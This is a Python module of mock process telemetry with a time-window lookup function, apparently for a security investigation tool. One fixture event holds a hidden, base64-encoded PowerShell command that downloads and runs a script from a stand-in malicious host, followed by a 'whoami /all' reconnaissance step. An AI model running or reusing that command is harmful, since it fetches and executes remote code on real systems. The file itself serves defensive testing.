from datetime import datetime, timedelta, timezone
from typing import List, Optional
from app.models.investigation import ProcessEvent

# Structured mock process telemetry dataset
MOCK_PROCESS_LOGS: List[ProcessEvent] = [
    ProcessEvent(
        event_id="EVT-PROC-101",
        timestamp=datetime.fromisoformat("2026-09-26T10:28:15+00:00"),
        host="DESKTOP-01",
        process_id=4102,
        parent_process_id=1024,
        process_name="explorer.exe",
        command_line="C:\\Windows\\explorer.exe",
        user="CORP\\jdoe",
        parent_process_name="userinit.exe",
    ),
    ProcessEvent(
        event_id="EVT-PROC-102",
        timestamp=datetime.fromisoformat("2026-09-26T10:29:45+00:00"),
        host="DESKTOP-01",
        process_id=5820,
        parent_process_id=4102,
        process_name="powershell.exe",
        command_line="powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBzAGkAdABlAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==",
        user="CORP\\jdoe",
        parent_process_name="explorer.exe",
    ),
    ProcessEvent(
        event_id="EVT-PROC-103",
        timestamp=datetime.fromisoformat("2026-09-26T10:30:10+00:00"),
        host="DESKTOP-01",
        process_id=6124,
        parent_process_id=5820,
        process_name="cmd.exe",
        command_line="cmd.exe /c whoami /all",
        user="CORP\\jdoe",
        parent_process_name="powershell.exe",
    ),
    ProcessEvent(
        event_id="EVT-PROC-201",
        timestamp=datetime.fromisoformat("2026-09-26T11:00:00+00:00"),
        host="SRV-DB-02",
        process_id=1840,
        parent_process_id=650,
        process_name="postgres.exe",
        command_line="postgres.exe -D /var/lib/postgresql/data",
        user="postgres",
        parent_process_name="services.exe",
    ),
]


def get_process_logs(
    host: str,
    timestamp: datetime,
    window_minutes: int = 15,
    process_name: Optional[str] = None,
) -> List[ProcessEvent]:
    """
    Retrieve process execution telemetry for a target host within a time window.
    
    Permissions: Read-only
    Side Effects: None
    """
    if timestamp.tzinfo is None:
        timestamp = timestamp.replace(tzinfo=timezone.utc)

    window = timedelta(minutes=window_minutes)
    start_time = timestamp - window
    end_time = timestamp + window

    matched_events = []
    for evt in MOCK_PROCESS_LOGS:
        if evt.host.lower() != host.lower():
            continue

        evt_ts = evt.timestamp
        if evt_ts.tzinfo is None:
            evt_ts = evt_ts.replace(tzinfo=timezone.utc)

        if start_time <= evt_ts <= end_time:
            if process_name is not None and evt.process_name.lower() != process_name.lower():
                continue
            matched_events.append(evt)

    return matched_events
